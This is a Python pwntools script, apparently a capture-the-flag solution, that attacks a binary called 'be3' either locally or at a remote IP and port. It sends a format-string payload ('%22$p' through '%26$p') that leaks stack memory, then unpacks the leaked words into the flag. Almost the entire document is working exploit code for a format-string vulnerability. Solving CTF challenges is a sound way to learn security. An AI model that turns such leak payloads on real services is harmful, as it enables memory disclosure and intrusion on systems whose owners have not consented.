#!/usr/bin/env python3

from pwn import *

exe = ELF("./be3", checksec=False)

context.binary = exe

HOST = "51.79.201.156"
PORT = 7015

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,
                       gdbscript='''
                       b *0x4012be
                       continue
                       '''
            )
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()

    r.recvuntil(b"Say something:")

    payload = b" ".join(
        f"%{i}$p".encode()
        for i in range(22, 27)
    )

    r.sendline(payload)

    output = r.recvall() 
    print(output)

    line = next(
            line for line in output.splitlines()
            if b"0x" in line
    )


    values = [
            int(x, 16)
            for x in line.split()
    ]

    flag = b"".join(p64(x) for x in values)

    print(f"flag: {flag.decode()}")

if __name__ == "__main__":
    main()
